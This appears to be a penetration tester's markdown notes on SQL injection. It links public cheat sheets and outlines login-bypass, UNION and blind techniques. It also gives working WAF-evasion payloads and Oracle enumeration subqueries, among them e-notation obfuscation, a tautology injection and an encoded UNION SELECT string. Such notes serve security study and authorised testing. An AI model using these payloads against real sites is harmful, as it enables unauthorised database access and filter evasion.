# SQL Injection 


cheat sheets : 
- [PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [invicti](https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/)
- [owasp](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [pentest-monkey](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)


###### notes:
- e notation can be used to confuse WAF and it will be removed from the playload and construct valid query 
```sql
SELECT table_name FROM information_schema 1.e.tables

select id 1.1e, char 10.2e(id 2.e), concat 3.e('a'12356.e,'b'1.e,'c'1.1234e)1.e, 12 1.e*2 1.e, 12 1.e/2 1.e, 12 1.e|2 1.e, 12 1.e^2 1.e, 12 1.e%2 1.e, 12 1.e&2 from test 1.e.test;

x=1' or 1.e(1) or '1'='1"                      "--not part of the payload
-- MSSQL function 
SELECT IIF(1>2,"YES","NO") 
```
- MSSQL has IIF function to turn blind error-based injection into boolean 


###### *** sqli example *** : 
- bypass login
- union attacks:
	- detrmine columns [ORDER BY 1] - [UNION SELECT NULL]
	- find column with useful datatype [UNION SELECT NULL,'A']
- **Blind Sqli**
	- conditional error LIKE : [IF 1=2] - [IF 1=1] 
	- conditional response LIKE : Divade on **Zero**
	- time delay ``
	- OAST Techniques 
	- 

```sql
SELECT * FROM users WHERE username = 'wiener' AND password = ('bluecheese')
```

#### Note:
+ Can't bypass prepare statement
+ don't use sqlmap as much as possible
+ make sure if the query is one of the following:
	+ UPDATE
	+ INSERT
	+ SELECT 
	+ SELECT  within ORDER BY  

- select first two columns in oracle sql, and more
```sql
(SELECT username FROM all_users where rownum=1)

(SELECT username FROM (SELECT username, rownum as rn FROM all_users order by username
asc) where rn=2)
-- list databases
(select owner from (select owner, rownum as rn from (select DISTINCT owner from all_tables
order by owner asc)) where rn=1)(select owner from (select owner, rownum as rn from (select
DISTINCT owner from all_tables order by owner asc)) where rn=2)
-- replace invalid chars in FQDN
(select replace(replace((table_name),' ','-'),'$','-') from (select table_name,rownum as rn from
all_tables order by table_name asc)rn where rn=1)
```



An SQL Injection attack can successfully bypass the WAF , and be conducted in all following
cases: • Vulnerabilities in the functions of WAF request normalization. • Application of HPP
and HPF techniques. • Bypassing filter rules (signatures). • Vulnerability exploitation by the
method of blind SQL Injection. • Attacking the application operating logics (and/or)

- WAF bypass using bufferover Flow
```
?page_id=null%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/+1,
2,3,4....
```